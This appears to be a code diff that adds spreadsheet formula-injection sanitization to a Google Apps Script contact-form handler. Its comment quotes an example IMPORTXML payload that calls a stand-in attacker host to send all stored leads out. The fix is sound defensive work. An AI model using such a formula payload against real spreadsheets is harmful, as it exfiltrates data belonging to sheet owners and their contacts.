@@ -40,6 +40,22 @@ var HEADERS = [
 // Optional. Leave '' to accept any request that knows the URL.
 var INQUIRY_SHARED_SECRET = '';
 
+/**
+ * Google Sheets parses a leading =, +, -, or @ as the start of a FORMULA, and
+ * anyone on the internet can type those characters into the public contact
+ * form. Left raw, a submission like
+ *   =IMPORTXML("https://attacker.example/?d="&JOIN(",",A:J), "//a")
+ * executes under the sheet owner's account and ships every stored lead to an
+ * outside server. Prefixing with an apostrophe forces Sheets to store the text
+ * literally; the apostrophe is not part of the value and is not shown in the
+ * cell. Do not remove this without a replacement defense.
+ */
+function sanitizeForSheet(value) {
+  if (value === undefined || value === null) return '';
+  var text = String(value);
+  return /^[=+\-@\t\r]/.test(text) ? "'" + text : text;
+}
+
 function doPost(e) {
   try {
     if (!e || !e.postData || !e.postData.contents) {
@@ -63,8 +79,7 @@ function doPost(e) {
 
     sheet.appendRow(
       HEADERS.map(function (key) {
-        var value = data[key];
-        return value === undefined || value === null ? '' : String(value);
+        return sanitizeForSheet(data[key]);
       })
     );
 
